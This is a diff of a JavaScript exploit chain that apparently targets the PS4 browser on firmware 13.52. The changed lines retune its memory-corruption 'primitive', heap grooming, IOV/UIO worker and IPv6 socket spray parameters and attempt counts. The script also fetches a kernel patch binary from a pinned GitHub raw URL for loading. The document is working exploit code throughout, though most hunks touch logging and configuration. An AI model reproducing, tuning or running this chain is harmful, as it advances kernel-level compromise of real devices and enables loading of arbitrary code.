@@ -1,8 +1,8 @@
 // ?v=10 must match mem.js's specifier EXACTLY or core.js builds a second
 // module record and releaseFakeCell() (only call site: mem.js:662) reaches a
 // virgin instance, pinning ~137 MB for the life of the page.
-import { establishPrimitive, dropGroomFootprint } from "./core.mjs?v=14";
-import { installWindowP, pairStatus } from "./mem.mjs";
+import { establishPrimitive, dropGroomFootprint } from "./core.mjs?v=15";
+import { installWindowP, pairStatus } from "./mem.mjs?v=15";
 import { int64 } from "./int64.mjs";
 import { offsetsFor } from "./ps4_13.52.mjs";
 import {
@@ -159,12 +159,13 @@ let savedMask = null, savedPrio = null, restoreCtx = null, attrsRestored = false
 
 let allDone = false;
 
-const CHAIN_BUILD = "plop-13.52-2026-03-26-primfix";
+const CHAIN_BUILD = "plop-13.52-2026-03-26-retail-groom";
 
 (async function () {
     let p = null;
     try {
-        mark("CHAIN-BUILD", CHAIN_BUILD);
+        logQuiet = params.get("domlog") !== "1";
+        post("CHAIN-BUILD", CHAIN_BUILD);
 
         const NUM_IOV_WORKER = params.has("iov")
             ? parseInt(params.get("iov"), 10) : NUM_IOV_WORKER_DEFAULT;
@@ -178,30 +179,30 @@ const CHAIN_BUILD = "plop-13.52-2026-03-26-primfix";
             if (seed > 0)
                 off = Object.assign({}, off, { wk_expm1_builtin: seed >>> 0 });
         }
-        mark("FW", key || "(not a PS4 UA)");
+        post("FW", key || "(not a PS4 UA)");
         if (key !== "13.52" || !off) {
             state("PS4 13.52 only", "bad");
-            mark("FW-REFUSED", "This build is hard-bound to firmware 13.52");
+            post("FW-REFUSED", "This build is hard-bound to firmware 13.52");
             return;
         }
-        mark("FW-STATUS", off.fw_status || "none");
+        post("FW-STATUS", off.fw_status || "none");
         const NUM_UIO_PLAN = params.has("uio")
             ? parseInt(params.get("uio"), 10) : NUM_UIO_WORKER_DEFAULT;
         const IPV6_PLAN = params.has("ipv6")
             ? parseInt(params.get("ipv6"), 10) : NUM_IPV6_SOCK_DEFAULT;
-        mark("PLAN", "iov_workers=" + NUM_IOV_WORKER + " uio_workers=" + NUM_UIO_PLAN
+        post("PLAN", "iov_workers=" + NUM_IOV_WORKER + " uio_workers=" + NUM_UIO_PLAN
             + " ipv6=" + IPV6_PLAN + " attempts=" + NUM_ATTEMPT
             + " spray=" + NUM_IOV_SPRAY
             + " mode=" + (STOP_BEFORE_DOUBLE ? "stop-before-double" : "armed")
-            + " (full: ?iov=4&uio=4&ipv6=256&slots=10000000)");
+            + " full=?slots=12000000&g=drain:512&iov=4&uio=4&ipv6=256");
 
         let kpatch = null, payload = null;
         let kernelBlobsLoaded = false;
         const kpatchName = "patches/1352.bin";
         const kpatchRemote = "https://raw.githubusercontent.com/OptiTronOffical/polpNO-use/aec207b31694bb182e032033a1bfab0863c171dd/patches/1352.bin";
         const KPATCH_JMP_SITES = [];
-        mark("KPATCH-BLOB", "deferred name=" + kpatchName);
-        mark("PAYLOAD-BLOB", "deferred");
+        post("KPATCH-BLOB", "deferred name=" + kpatchName);
+        post("PAYLOAD-BLOB", "deferred");
 
         async function ensureKernelBlobs() {
             if (kernelBlobsLoaded) return;
@@ -240,15 +241,14 @@ const CHAIN_BUILD = "plop-13.52-2026-03-26-primfix";
                 : "MISSING");
         }
 
-        logQuiet = params.get("domlog") !== "1";
         lines.length = 0;
         if (outEl) outEl.textContent = "";
         state("running the primitive...", "warn");
         await new Promise(r => setTimeout(r, 0));
 
         const carrier = await establishPrimitive({
-            maxAttempts: 4,
-            onEvent: (t, d, a) => trace(t, (a != null ? "[" + a + "] " : "") + (d || ""))
+            maxAttempts: 2,
+            onEvent: (t, d, a) => post(t, (a != null ? "[" + a + "] " : "") + (d || ""))
         });
         // THE EXPERIMENT. Promotion releases the ~137 MB the OOM is made of --
         // proven: PAIR-UP released=13 on 2026-08-16 14:44. But releaseFakeCell()
